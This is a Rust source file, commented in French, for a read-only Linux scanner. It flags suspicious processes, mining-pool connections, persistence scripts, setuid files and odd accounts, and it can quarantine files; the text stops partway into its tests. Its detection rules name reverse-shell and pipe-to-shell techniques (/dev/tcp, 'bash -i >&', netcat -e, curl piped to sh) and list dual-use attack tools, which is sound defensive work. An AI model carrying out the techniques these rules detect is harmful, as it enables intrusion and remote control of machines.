//! Scan des comportements anormaux.
//!
//! Analyse heuristique, **en lecture seule**, des logiciels en cours
//! d'exécution et de ce qui les relance : processus, connexions réseau,
//! scripts de démarrage, fichiers exécutables dans les dossiers temporaires,
//! comptes et outils à double usage. Aucune base de signatures : ce n'est pas
//! un antivirus. Chaque constat est un indice à vérifier (il peut y avoir des
//! faux positifs) et indique pourquoi il a été levé.

use crate::exec;
use crate::p_network::{self, Connection};
use crate::p_system;
use crate::panel::*;
use crate::processes::{self, ProcAction, Sampler};
use crate::util;
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

// ---------------------------------------------------------------------------
// Modèle
// ---------------------------------------------------------------------------

/// Gravité d'un constat (l'ordre sert au tri : `High` d'abord).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    High,
    Medium,
    Low,
    Info,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::High => "Élevée",
            Severity::Medium => "Moyenne",
            Severity::Low => "Faible",
            Severity::Info => "Info",
        }
    }
}

/// Un constat du scan.
#[derive(Debug, Clone)]
pub struct Finding {
    pub severity: Severity,
    pub category: &'static str,
    pub subject: String,
    pub detail: String,
    pub actions: Vec<Cmd>,
}

// ---------------------------------------------------------------------------
// Règles sur les processus
// ---------------------------------------------------------------------------

pub const TEMP_DIRS: [&str; 3] = ["/tmp/", "/var/tmp/", "/dev/shm/"];

/// Noms associés à des mineurs de cryptomonnaie ou des maliciels courants.
pub const SUSPICIOUS_NAMES: [&str; 14] = [
    "xmrig", "minerd", "cpuminer", "ccminer", "cgminer", "bfgminer", "ethminer", "nbminer",
    "lolminer", "kdevtmpfsi", "kinsing", "minergate", "phoenixminer", "xmr-stak",
];

/// Ports typiques des pools de minage.
pub const MINING_PORTS: [u16; 7] = [3333, 4444, 5555, 7777, 14433, 14444, 45700];

/// Dossiers cachés du dossier personnel où des outils légitimes s'exécutent.
pub const TRUSTED_HIDDEN: [&str; 20] = [
    ".local/share/JetBrains", ".local/share/Steam", ".local/share/flatpak", ".local/share/pnpm",
    ".local/share/mise", ".local/bin", ".cargo", ".rustup", ".nvm", ".vscode", ".vscode-server",
    ".var/app", ".pyenv", ".sdkman", ".npm", ".bun", ".deno", ".volta", ".asdf", ".config/Code",
];

/// Racines où un exécutable système légitime se trouve.
const SYSTEM_ROOTS: [&str; 9] = [
    "/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/", "/snap/", "/opt/", "/nix/", "/var/lib/flatpak/",
];

pub fn in_temp_dir(path: &str) -> bool {
    TEMP_DIRS.iter().any(|dir| path.starts_with(dir))
}

pub fn is_suspicious_name(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    SUSPICIOUS_NAMES.iter().any(|name| lower.contains(name))
}

/// Gravité d'un exécutable situé dans un dossier caché du dossier personnel :
/// `None` pour un outil connu ou un chemin non caché ; `Low` pour les données
/// d'application (`~/.config`, `~/.local` : mises à jour d'applications
/// Electron, etc.) ; `Medium` pour tout autre dossier caché (`~/.x/`, `~/.cache/`).
pub fn hidden_path_severity(path: &str, home: &str) -> Option<Severity> {
    let relative = path.strip_prefix(home)?.trim_start_matches('/');
    let parts: Vec<&str> = relative.split('/').collect();
    let directories = &parts[..parts.len().saturating_sub(1)];
    if !directories.iter().any(|part| part.starts_with('.') && part.len() > 1) {
        return None;
    }
    if TRUSTED_HIDDEN.iter().any(|trusted| relative.starts_with(trusted)) {
        return None;
    }
    if matches!(directories.first(), Some(&".config") | Some(&".local")) {
        Some(Severity::Low)
    } else {
        Some(Severity::Medium)
    }
}

/// Le chemin traverse-t-il un dossier caché inhabituel du dossier personnel ?
pub fn untrusted_hidden_path(path: &str, home: &str) -> bool {
    hidden_path_severity(path, home).is_some()
}

/// Vue d'un processus utilisée par les règles (testable sans `/proc`).
#[derive(Debug, Clone, Default)]
pub struct ProcView {
    pub pid: u32,
    pub name: String,
    pub user: String,
    /// Chemin de l'exécutable ; `None` si illisible (processus d'un autre utilisateur).
    pub exe: Option<String>,
    pub exe_deleted: bool,
    pub cmdline: String,
    pub cpu: f32,
}

const KERNEL_LOOKALIKES: [&str; 6] = ["kworker", "ksoftirqd", "kthreadd", "migration/", "rcu_", "watchdog/"];
const CORE_DAEMONS: [&str; 6] = ["sshd", "systemd", "cron", "dbus-daemon", "init", "login"];

/// Raisons pour lesquelles un processus est jugé anormal, avec leur gravité.
pub fn assess_process(view: &ProcView, home: &str) -> Vec<(Severity, String)> {
    let mut reasons: Vec<(Severity, String)> = Vec::new();
    let first = view.cmdline.split_whitespace().next().unwrap_or("");
    let location = view.exe.as_deref().unwrap_or(first);
    let base = Path::new(location)
        .file_name()
        .map(|name| name.to_string_lossy().to_string())
        .unwrap_or_default();

    if is_suspicious_name(&view.name) || is_suspicious_name(&base) {
        reasons.push((Severity::High, "nom associé à un mineur ou à un maliciel connu".to_string()));
    }
    if view.exe_deleted {
        reasons.push((
            Severity::High,
            "l'exécutable a été supprimé du disque pendant que le processus tourne".to_string(),
        ));
    }
    if location.starts_with("/memfd:") {
        reasons.push((Severity::High, "exécuté depuis la mémoire (memfd), sans fichier sur le disque".to_string()));
    }
    if in_temp_dir(location) {
        reasons.push((Severity::High, format!("lancé depuis un dossier temporaire ({location})")));
    } else if let Some(severity) = hidden_path_severity(location, home) {
        reasons.push((severity, format!("lancé depuis un dossier caché inhabituel ({location})")));
    }
    if KERNEL_LOOKALIKES.iter().any(|prefix| view.name.starts_with(prefix)) {
        reasons.push((Severity::High, "se fait passer pour un thread du noyau alors qu'il a une ligne de commande".to_string()));
    }
    if let Some(exe) = &view.exe {
        if CORE_DAEMONS.contains(&view.name.as_str()) && !SYSTEM_ROOTS.iter().any(|root| exe.starts_with(root)) {
            reasons.push((
                Severity::Medium,
                format!("porte le nom d'un service système mais s'exécute depuis {exe}"),
            ));
        }
    }
    if view.cpu >= 90.0 {
        reasons.push((Severity::Low, format!("consomme {:.0} % du processeur", view.cpu)));
    }
    reasons
}

// ---------------------------------------------------------------------------
// Règles sur le réseau
// ---------------------------------------------------------------------------

fn port_of(address: &str) -> Option<u16> {
    address.rsplit(':').next()?.parse().ok()
}

/// Connexions anormales : `(gravité, sujet, détail, pid)`.
pub fn assess_connections(
    connections: &[Connection],
    flagged: &HashSet<u32>,
) -> Vec<(Severity, String, String, Option<u32>)> {
    let mut found = Vec::new();
    for connection in connections {
        let who = if connection.process.is_empty() { "(processus inconnu)".to_string() } else { connection.process.clone() };
        if connection.state == "ESTAB" {
            if let Some(port) = port_of(&connection.peer) {
                if MINING_PORTS.contains(&port) {
                    found.push((
                        Severity::High,
                        who.clone(),
                        format!("connexion vers {} : port typique d'un pool de minage", connection.peer),
                        connection.pid,
                    ));
                    continue;
                }
            }
        }
        if let Some(pid) = connection.pid.filter(|pid| flagged.contains(pid)) {
            let listening = connection.state == "LISTEN" || connection.state == "UNCONN";
            if listening && (connection.local.starts_with("0.0.0.0:") || connection.local.starts_with("*:") || connection.local.starts_with("[::]:")) {
                found.push((
                    Severity::Medium,
                    who,
                    format!("processus suspect à l'écoute sur toutes les interfaces ({})", connection.local),
                    Some(pid),
                ));
            } else if connection.state == "ESTAB" {
                found.push((
                    Severity::Medium,
                    who,
                    format!("processus suspect connecté à {}", connection.peer),
                    Some(pid),
                ));
            }
        }
    }
    found
}

// ---------------------------------------------------------------------------
// Règles sur les scripts de démarrage
// ---------------------------------------------------------------------------

/// Nature d'un fichier de démarrage analysé.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScriptKind {
    ShellRc,
    Cron,
    Autostart,
    Unit,
}

fn has_pipe_to_shell(line: &str) -> bool {
    ["| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "| perl", "| sudo sh", "| sudo bash"]
        .iter()
        .any(|pattern| line.contains(pattern))
}

/// Analyse le texte d'un script : `(gravité, raison, ligne)`.
pub fn scan_script_text(text: &str, kind: ScriptKind) -> Vec<(Severity, &'static str, String)> {
    let mut found = Vec::new();
    for raw in text.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let lower = line.to_ascii_lowercase();
        let mut hit = |severity: Severity, reason: &'static str| found.push((severity, reason, line.to_string()));
        if (lower.contains("curl") || lower.contains("wget")) && has_pipe_to_shell(&lower) {
            hit(Severity::High, "télécharge et exécute du code distant (curl/wget | sh)");
        } else if lower.contains("base64") && (lower.contains(" -d") || lower.contains("--decode")) && (has_pipe_to_shell(&lower) || lower.contains("eval")) {
            hit(Severity::High, "exécute du code encodé en base64");
        } else if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
            hit(Severity::High, "connexion réseau via /dev/tcp (typique d'un shell inversé)");
        } else if lower.contains("bash -i >&") || ((lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat ")) && (lower.contains(" -e ") || lower.contains(" -c "))) {
            hit(Severity::High, "shell inversé (netcat/bash -i)");
        } else if lower.contains("xmrig") || lower.contains("minerd") || lower.contains("cpuminer") || lower.contains("stratum+tcp") || lower.contains("stratum+ssl") {
            hit(Severity::High, "référence à un mineur de cryptomonnaie");
        } else if matches!(kind, ScriptKind::Cron | ScriptKind::Autostart | ScriptKind::Unit)
            && ["/tmp/", "/dev/shm/", "/var/tmp/"].iter().any(|dir| lower.contains(dir))
        {
            hit(Severity::High, "lance un programme situé dans un dossier temporaire");
        } else if kind == ScriptKind::ShellRc && lower.contains("ld_preload") {
            hit(Severity::Medium, "définit LD_PRELOAD (injection de bibliothèque)");
        } else if kind == ScriptKind::ShellRc && ["alias sudo=", "alias su=", "alias ssh=", "alias passwd="].iter().any(|alias| lower.starts_with(alias)) {
            hit(Severity::Medium, "détourne une commande sensible par un alias");
        }
    }
    found
}

// ---------------------------------------------------------------------------
// Règles sur les fichiers
// ---------------------------------------------------------------------------

/// Un fichier exécutable ou à bit setuid trouvé hors des emplacements normaux.
#[derive(Debug, Clone, PartialEq)]
pub struct FileHit {
    pub path: PathBuf,
    pub suid: bool,
    pub kind: &'static str,
}

fn skip_dir(name: &str) -> bool {
    name.starts_with(".mount_")
        || name.starts_with("snap-private-tmp")
        || name.starts_with("systemd-private-")
        || name.starts_with("tracker-extract")
        || matches!(name, ".cache" | "node_modules" | "target" | ".git" | "Steam")
}

fn executable_kind(path: &Path) -> Option<&'static str> {
    use std::io::Read;
    let mut magic = [0u8; 4];
    let mut file = std::fs::File::open(path).ok()?;
    let read = file.read(&mut magic).ok()?;
    if read >= 4 && magic == [0x7f, b'E', b'L', b'F'] {
        Some("ELF")
    } else if read >= 2 && &magic[..2] == b"#!" {
        Some("script")
    } else {
        None
    }
}

/// Parcourt `root` (profondeur et nombre d'entrées bornés, liens symboliques
/// ignorés). `check_exec` : signale aussi les exécutables ELF/scripts ; les
/// fichiers setuid/setgid sont toujours signalés.
pub fn walk_files(root: &Path, depth: usize, budget: &mut usize, check_exec: bool, out: &mut Vec<FileHit>) {
    use std::os::unix::fs::PermissionsExt;
    if depth == 0 || *budget == 0 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(root) else { return };
    for entry in entries.flatten() {
        if *budget == 0 {
            return;
        }
        *budget -= 1;
        let path = entry.path();
        let Ok(meta) = std::fs::symlink_metadata(&path) else { continue };
        let name = entry.file_name().to_string_lossy().to_string();
        if meta.is_dir() {
            if !skip_dir(&name) {
                walk_files(&path, depth - 1, budget, check_exec, out);
            }
        } else if meta.is_file() {
            let mode = meta.permissions().mode();
            let suid = mode & 0o6000 != 0;
            if suid {
                out.push(FileHit { path, suid: true, kind: "setuid/setgid" });
            } else if check_exec && mode & 0o111 != 0 {
                if let Some(kind) = executable_kind(&path) {
                    out.push(FileHit { path, suid: false, kind });
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Comptes
// ---------------------------------------------------------------------------

/// Anomalies de `/etc/passwd` : `(compte, raison)`.
pub fn assess_passwd(text: &str) -> Vec<(String, &'static str)> {
    let mut found = Vec::new();
    for line in text.lines() {
        let fields: Vec<&str> = line.split(':').collect();
        if fields.len() < 7 || line.starts_with('#') {
            continue;
        }
        if fields[2] == "0" && fields[0] != "root" {
            found.push((fields[0].to_string(), "compte avec l'UID 0 (équivalent root) autre que root"));
        }
        if fields[1].is_empty() {
            found.push((fields[0].to_string(), "compte sans mot de passe"));
        }
    }
    found
}

// ---------------------------------------------------------------------------
// Outils à double usage
// ---------------------------------------------------------------------------

/// Paquets légitimes mais couramment détournés.
pub const DUAL_USE: [&str; 22] = [
    "hydra", "john", "aircrack-ng", "hashcat", "metasploit-framework", "sqlmap", "nikto", "ettercap-common",
    "nmap", "ncat", "netcat-traditional", "netcat-openbsd", "socat", "masscan", "responder", "medusa",
    "tor", "proxychains4", "tcpdump", "wireshark", "xmrig", "cpuminer",
];

/// Noms de paquets installés, quel que soit le gestionnaire (dpkg, rpm, pacman, apk).
pub fn installed_package_names() -> Vec<String> {
    let lines = |text: String| -> Vec<String> { text.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect() };
    if exec::exists("dpkg-query") {
        return run_lossy("dpkg-query", &["-W", "-f", "${Package} ${db:Status-Abbrev}\n"])
            .lines()
            .filter_map(|line| {
                let (name, status) = line.split_once(' ')?;
                status.starts_with("ii").then(|| name.to_string())
            })
            .collect();
    }
    if exec::exists("rpm") {
        return lines(run_lossy("rpm", &["-qa", "--qf", "%{NAME}\n"]));
    }
    if exec::exists("pacman") {
        return lines(run_lossy("pacman", &["-Qq"]));
    }
    if exec::exists("apk") {
        // `apk info` liste les noms ; les versions sont retirées par précaution.
        return lines(run_lossy("apk", &["info"]));
    }
    Vec::new()
}

/// Paquets à double usage parmi une liste de noms.
pub fn dual_use_among(names: &[String]) -> Vec<String> {
    let mut found: Vec<String> = names.iter().filter(|name| DUAL_USE.contains(&name.as_str())).cloned().collect();
    found.sort();
    found.dedup();
    found
}

pub fn dual_use_installed(dpkg_output: &str) -> Vec<String> {
    dpkg_output
        .lines()
        .filter_map(|line| {
            let (name, status) = line.split_once(' ')?;
            (status.starts_with("ii") && DUAL_USE.contains(&name)).then(|| name.to_string())
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Actions de réponse
// ---------------------------------------------------------------------------

fn process_action(args: &[String]) -> Result<String, String> {
    let [pid, name, op] = args else {
        return Err("arguments invalides".to_string());
    };
    let pid: u32 = pid.parse().map_err(|_| "PID invalide".to_string())?;
    let action = match op.as_str() {
        "stop" => ProcAction::Suspend,
        "term" => ProcAction::Terminate,
        _ => return Err(format!("opération inconnue : {op}")),
    };
    processes::apply(pid, name, action)
}

/// Dossier de quarantaine.
pub fn quarantine_dir() -> PathBuf {
    data_dir().join("quarantine")
}

/// Emplacements dont un fichier peut être mis en quarantaine.
pub fn quarantine_allowed(path: &Path) -> bool {
    let text = path.to_string_lossy();
    safe_abs_path(&text) && (in_temp_dir(&text) || util::path_within(&home(), path))
}

/// Déplace un fichier vers `destination_dir` : copie, retrait de tous les
/// droits d'exécution, suppression de l'original et note sur l'origine.
/// Refuse les liens, dossiers et fichiers d'un autre utilisateur.
pub fn quarantine_into(path: &Path, destination_dir: &Path) -> Result<String, String> {
    use std::os::unix::fs::{MetadataExt, OpenOptionsExt, PermissionsExt};
    if !quarantine_allowed(path) {
        return Err("emplacement refusé (dossier personnel et dossiers temporaires uniquement)".to_string());
    }
    let meta = std::fs::symlink_metadata(path).map_err(|error| format!("fichier introuvable : {error}"))?;
    if !meta.is_file() {
        return Err("seul un fichier ordinaire peut être mis en quarantaine".to_string());
    }
    let me = std::fs::metadata("/proc/self").map(|m| m.uid()).unwrap_or(u32::MAX);
    if meta.uid() != me {
        return Err("fichier appartenant à un autre utilisateur : droits administrateur requis".to_string());
    }
    std::fs::create_dir_all(destination_dir).map_err(|error| error.to_string())?;
    std::fs::set_permissions(destination_dir, std::fs::Permissions::from_mode(0o700)).map_err(|error| error.to_string())?;
    let name = path.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "fichier".to_string());
    let stamp = chrono::Local::now().format("%Y%m%d-%H%M%S").to_string();
    let target = destination_dir.join(format!("{stamp}-{name}.quarantaine"));
    let mut source = std::fs::File::open(path).map_err(|error| error.to_string())?;
    let mut copy = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&target)
        .map_err(|error| error.to_string())?;
    std::io::copy(&mut source, &mut copy).map_err(|error| error.to_string())?;
    std::fs::write(
        target.with_extension("quarantaine.info"),
        format!("origine : {}\ndate : {}\n", path.display(), util::now_human()),
    )
    .map_err(|error| error.to_string())?;
    std::fs::remove_file(path).map_err(|error| format!("copie faite mais original non supprimé : {error}"))?;
    Ok(format!("Mis en quarantaine : {}", target.display()))
}

fn quarantine_action(args: &[String]) -> Result<String, String> {
    let [path] = args else {
        return Err("fichier attendu".to_string());
    };
    quarantine_into(Path::new(path), &quarantine_dir())
}

// ---------------------------------------------------------------------------
// Collecte
// ---------------------------------------------------------------------------

fn read_limited(path: &Path) -> String {
    use std::io::Read;
    let Ok(file) = std::fs::File::open(path) else { return String::new() };
    let mut text = String::new();
    let _ = file.take(256 * 1024).read_to_string(&mut text);
    text
}

/// Statistiques de couverture du scan.
#[derive(Debug, Default, Clone)]
pub struct Coverage {
    pub processes: usize,
    pub inspectable: usize,
    pub connections: usize,
    pub scripts: usize,
    pub files_budget_used: usize,
    pub files_truncated: bool,
    pub seconds: f32,
}

fn collect_processes() -> Vec<ProcView> {
    let mut sampler = Sampler::new();
    let _ = sampler.refresh();
    std::thread::sleep(Duration::from_millis(1000));
    let (list, _) = sampler.refresh();
    list.into_iter()
        .filter(|process| !process.cmdline.is_empty() && process.pid != std::process::id())
        .map(|process| {
            let link = std::fs::read_link(format!("/proc/{}/exe", process.pid)).ok();
            let (exe, deleted) = match link {
                Some(path) => {
                    let text = path.to_string_lossy().to_string();
                    match text.strip_suffix(" (deleted)") {
                        Some(clean) => (Some(clean.to_string()), true),
                        None => (Some(text), false),
                    }
                }
                None => (None, false),
            };
            ProcView {
                pid: process.pid,
                name: process.name,
                user: process.user,
                exe,
                exe_deleted: deleted,
                cmdline: process.cmdline,
                cpu: process.cpu,
            }
        })
        .collect()
}

fn script_sources(home: &Path) -> Vec<(PathBuf, ScriptKind)> {
    let mut sources = Vec::new();
    for name in [".bashrc", ".bash_profile", ".profile", ".zshrc", ".zprofile", ".bash_aliases"] {
        sources.push((home.join(name), ScriptKind::ShellRc));
    }
    let list_dir = |dir: PathBuf, extension: &str, kind: ScriptKind, out: &mut Vec<(PathBuf, ScriptKind)>| {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.extension().is_some_and(|ext| ext == extension) || extension.is_empty() {
                    out.push((path, kind));
                }
            }
        }
    };
    list_dir(home.join(".config/autostart"), "desktop", ScriptKind::Autostart, &mut sources);
    list_dir(home.join(".config/systemd/user"), "service", ScriptKind::Unit, &mut sources);
    list_dir(PathBuf::from("/etc/cron.d"), "", ScriptKind::Cron, &mut sources);
    list_dir(PathBuf::from("/etc/profile.d"), "sh", ScriptKind::ShellRc, &mut sources);
    sources.push((PathBuf::from("/etc/crontab"), ScriptKind::Cron));
    sources
}

fn push_script_findings(findings: &mut Vec<Finding>, label: &str, text: &str, kind: ScriptKind, autostart_path: Option<&Path>) {
    for (severity, reason, line) in scan_script_text(text, kind) {
        let mut actions = Vec::new();
        if let Some(path) = autostart_path {
            if p_system::autostart_path_ok(&path.to_string_lossy()) {
                actions.push(Cmd::local(
                    "Désactiver au démarrage",
                    p_system::toggle_autostart,
                    vec![path.to_string_lossy().to_string(), "off".to_string()],
                ));
            }
        }
        findings.push(Finding {
            severity,
            category: "Persistance",
            subject: label.to_string(),
            detail: format!("{reason} : {}", util::ellipsis(&line, 110)),
            actions,
        });
    }
}

/// Lance le scan complet et renvoie les constats avec la couverture.
pub fn run_scan() -> (Vec<Finding>, Coverage) {
    let started = Instant::now();
    let home_path = home();
    let home_text = home_path.to_string_lossy().to_string();
    let mut findings: Vec<Finding> = Vec::new();
    let mut coverage = Coverage::default();

    // 1. Processus
    let views = collect_processes();
    coverage.processes = views.len();
    coverage.inspectable = views.iter().filter(|view| view.exe.is_some()).count();
    let mut flagged: HashSet<u32> = HashSet::new();
    for view in &views {
        let reasons = assess_process(view, &home_text);
        if reasons.is_empty() {
            continue;
        }
        let severity = reasons.iter().map(|(severity, _)| *severity).min().unwrap_or(Severity::Info);
        // Seuls les processus au moins « moyens » servent à qualifier le réseau.
        if severity <= Severity::Medium {
            flagged.insert(view.pid);
        }
        let detail = reasons.iter().map(|(_, reason)| reason.as_str()).collect::<Vec<_>>().join(" ; ");
        let mut actions = Vec::new();
        if processes::check_target(view.pid, &view.name).is_ok() {
            let args = |op: &str| vec![view.pid.to_string(), view.name.clone(), op.to_string()];
            actions.push(Cmd::local("Suspendre", process_action, args("stop")));
            actions.push(
                Cmd::local("Terminer", process_action, args("term"))
                    .confirm(&format!("Terminer {} (PID {}) ?", view.name, view.pid)),
            );
            if let Some(exe) = &view.exe {
                if quarantine_allowed(Path::new(exe)) && Path::new(exe).is_file() {
                    actions.push(
                        Cmd::local("Quarantaine", quarantine_action, vec![exe.clone()])
                            .confirm(&format!("Déplacer {exe} en quarantaine (droits d'exécution retirés) ? Terminez d'abord le processus.")),
                    );
                }
            }
        }
        findings.push(Finding {
            severity,
            category: "Processus",
            subject: format!("{} (PID {}, {})", view.name, view.pid, view.user),
            detail,
            actions,
        });
    }

    // 2. Réseau
    if let Ok(text) = run_text("ss", &["-H", "-tunap"]) {
        let connections = p_network::parse_ss(&text);
        coverage.connections = connections.len();
        for (severity, subject, detail, pid) in assess_connections(&connections, &flagged) {
            let mut actions = Vec::new();
            if let (Some(pid), true) = (pid, !subject.starts_with('(')) {
                if processes::check_target(pid, &subject).is_ok() {
                    actions.push(Cmd::local("Suspendre", process_action, vec![pid.to_string(), subject.clone(), "stop".to_string()]));
                }
            }
            findings.push(Finding { severity, category: "Réseau", subject, detail, actions });
        }
    }

    // 3. Persistance
    for (path, kind) in script_sources(&home_path) {
        let text = read_limited(&path);
        if text.is_empty() {
            continue;
        }
        coverage.scripts += 1;
        let label = path.display().to_string();
        let autostart = (kind == ScriptKind::Autostart).then_some(path.as_path());
        push_script_findings(&mut findings, &label, &text, kind, autostart);
    }
    if let Ok(output) = exec::run_with_timeout("crontab", &["-l"], Duration::from_secs(10)) {
        if output.ok {
            coverage.scripts += 1;
            push_script_findings(&mut findings, "crontab (utilisateur)", &output.stdout, ScriptKind::Cron, None);
        }
    }
    let preload = read_limited(Path::new("/etc/ld.so.preload"));
    if preload.lines().any(|line| !line.trim().is_empty() && !line.trim().starts_with('#')) {
        findings.push(Finding {
            severity: Severity::High,
            category: "Persistance",
            subject: "/etc/ld.so.preload".to_string(),
            detail: "bibliothèque injectée dans tous les processus (technique de rootkit) : ".to_string() + &util::ellipsis(preload.trim(), 80),
            actions: Vec::new(),
        });
    }

    // 4. Fichiers
    let mut hits = Vec::new();
    let mut budget = 40_000usize;
    for dir in ["/tmp", "/var/tmp", "/dev/shm"] {
        walk_files(Path::new(dir), 3, &mut budget, true, &mut hits);
    }
    walk_files(&home_path, 4, &mut budget, false, &mut hits);
    coverage.files_budget_used = 40_000 - budget;
    coverage.files_truncated = budget == 0;
    for hit in hits {
        let path_text = hit.path.to_string_lossy().to_string();
        let (severity, detail) = if hit.suid {
            (Severity::High, "fichier setuid/setgid hors des dossiers système : peut donner des droits élevés".to_string())
        } else {
            (Severity::Medium, format!("exécutable ({}) dans un dossier temporaire", hit.kind))
        };
        let mut actions = Vec::new();
        if quarantine_allowed(&hit.path) {
            actions.push(
                Cmd::local("Mettre en quarantaine", quarantine_action, vec![path_text.clone()])
                    .confirm(&format!("Déplacer {path_text} en quarantaine ?")),
            );
        }
        findings.push(Finding { severity, category: "Fichiers", subject: path_text, detail, actions });
    }

    // 5. Comptes
    for (account, reason) in assess_passwd(&read("/etc/passwd")) {
        findings.push(Finding {
            severity: Severity::High,
            category: "Comptes",
            subject: account,
            detail: reason.to_string(),
            actions: Vec::new(),
        });
    }

    // 6. Logiciels à double usage
    for name in dual_use_among(&installed_package_names()) {
        findings.push(Finding {
            severity: Severity::Info,
            category: "Logiciels",
            subject: name,
            detail: "outil légitime souvent détourné : vérifiez que vous l'avez bien installé vous-même".to_string(),
            actions: Vec::new(),
        });
    }
    for app in crate::manual::detect(&HashSet::new()) {
        let location = app.path.to_string_lossy().to_string();
        let (severity, detail) = if in_temp_dir(&location) {
            (Severity::Medium, "logiciel installé hors dépôts dans un dossier temporaire")
        } else if app.kind != crate::manual::ManualKind::Desktop && untrusted_hidden_path(&location, &home_text) {
            (Severity::Low, "logiciel installé hors dépôts dans un dossier caché")
        } else {
            continue;
        };
        findings.push(Finding {
            severity,
            category: "Logiciels",
            subject: format!("{} ({location})", app.name),
            detail: detail.to_string(),
            actions: Vec::new(),
        });
    }

    findings.sort_by(|a, b| a.severity.cmp(&b.severity).then(a.category.cmp(b.category)).then(a.subject.cmp(&b.subject)));
    coverage.seconds = started.elapsed().as_secs_f32();
    (findings, coverage)
}

// ---------------------------------------------------------------------------
// Rubrique
// ---------------------------------------------------------------------------

/// Verdict global d'après les gravités.
pub fn verdict(findings: &[Finding]) -> (&'static str, Level) {
    let count = |severity: Severity| findings.iter().filter(|finding| finding.severity == severity).count();
    if count(Severity::High) > 0 {
        ("À examiner en priorité", Level::Bad)
    } else if count(Severity::Medium) > 0 {
        ("Quelques points suspects", Level::Warn)
    } else {
        ("Aucun comportement anormal détecté", Level::Ok)
    }
}

pub fn behavior_scan() -> Panel {
    let mut panel = Panel::default();
    let (findings, coverage) = run_scan();
    let (text, level) = verdict(&findings);
    panel.metric("Verdict", text, level);
    let count = |severity: Severity| findings.iter().filter(|finding| finding.severity == severity).count();
    panel.metric("Élevées", count(Severity::High).to_string(), if count(Severity::High) > 0 { Level::Bad } else { Level::Ok });
    panel.metric("Moyennes", count(Severity::Medium).to_string(), if count(Severity::Medium) > 0 { Level::Warn } else { Level::Ok });
    panel.metric("Faibles", count(Severity::Low).to_string(), Level::Info);
    panel.metric("Infos", count(Severity::Info).to_string(), Level::Info);
    panel.metric("Durée", format!("{:.1} s", coverage.seconds), Level::Info);

    let rows = findings
        .iter()
        .map(|finding| {
            let mut row = Row::owned(vec![
                finding.severity.label().to_string(),
                finding.category.to_string(),
                util::ellipsis(&finding.subject, 70),
                finding.detail.clone(),
            ])
            .bad(finding.severity <= Severity::Medium);
            row.actions = finding.actions.clone();
            row
        })
        .collect();
    panel.section(
        Section::new("Constats")
            .chart(
                Chart::bars(
                    "Constats par gravité",
                    "",
                    vec!["Élevée".into(), "Moyenne".into(), "Faible".into(), "Info".into()],
                    vec![
                        count(Severity::High) as f32,
                        count(Severity::Medium) as f32,
                        count(Severity::Low) as f32,
                        count(Severity::Info) as f32,
                    ],
                )
                .max_y(((findings.len() as f32).max(4.0) / 4.0).ceil() * 4.0),
            )
            .columns(&["Gravité", "Catégorie", "Élément", "Pourquoi"])
            .rows(rows)
            .note("Analyse heuristique en lecture seule, sans base de signatures : ce n'est pas un antivirus. Un constat est un indice à vérifier, pas une preuve."),
    );

    panel.section(
        Section::new("Couverture du scan").text(format!(
            "Processus examinés : {} (exécutable lisible pour {} ; les processus d'autres utilisateurs ne sont jugés que sur leur nom et leur ligne de commande)\n\
             Connexions réseau : {}\n\
             Scripts de démarrage et planifications : {}\n\
             Entrées de fichiers parcourues : {} (dossiers temporaires et dossier personnel, profondeur limitée){}\n\
             Vérifié : processus, réseau, persistance, fichiers exécutables/setuid, comptes, outils à double usage.\n\
             Non vérifié : contenu des fichiers (hors scripts de démarrage), mémoire, noyau, firmware.",
            coverage.processes, coverage.inspectable, coverage.connections, coverage.scripts, coverage.files_budget_used,
            if coverage.files_truncated { " — limite atteinte, parcours partiel" } else { "" }
        )),
    );

    let mut av = Section::new("Analyse antivirus (signatures)");
    if exec::exists("clamscan") {
        let mut args = vec!["-r".to_string(), "-i".to_string(), "--max-filesize=100M".to_string(), "--max-scansize=200M".to_string()];
        if let Some(downloads) = dirs::download_dir() {
            args.push(downloads.to_string_lossy().to_string());
        }
        args.push("/tmp".to_string());
        av = av
            .note("ClamAV est installé : l'analyse parcourt Téléchargements et /tmp et peut durer plusieurs minutes. Seuls les fichiers infectés sont listés.")
            .action(
                Cmd::owned("Lancer ClamAV (Téléchargements et /tmp)", "clamscan", args)
                    .confirm("Lancer une analyse ClamAV de Téléchargements et /tmp ? Cela peut prendre plusieurs minutes."),
            );
    } else {
        av = av.note("Pour une détection par signatures, installez ClamAV (paquet « clamav ») : ce scan pourra alors le lancer.");
    }
    panel.section(av);
    panel.section(
        Section::new("Quarantaine")
            .note(&format!(
                "Les fichiers mis en quarantaine sont copiés sans droit d'exécution dans {} avec une note d'origine ; ils ne sont pas supprimés définitivement.",
                quarantine_dir().display()
            )),
    );
    panel
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOME: &str = "/home/amine";

    fn view(name: &str, exe: Option<&str>, cmdline: &str) -> ProcView {
        ProcView {
            pid: 4242,
            name: name.to_string(),
            user: "amine".to_string(),
            exe: exe.map(str::to_string),
            exe_deleted: false,
            cmdline: cmdline.to_string(),
            cpu: 1.0,
        }
    }

    fn worst(reasons: &[(Severity, String)]) -> Option<Severity> {
        reasons.iter().map(|(severity, _)| *severity).min()
    }

    #[test]
    fn normal_programs_raise_nothing() {
        assert!(assess_process(&view("firefox", Some("/usr/lib/firefox/firefox"), "firefox"), HOME).is_empty());
        assert!(assess_process(&view("code", Some("/usr/share/code/code"), "code"), HOME).is_empty());
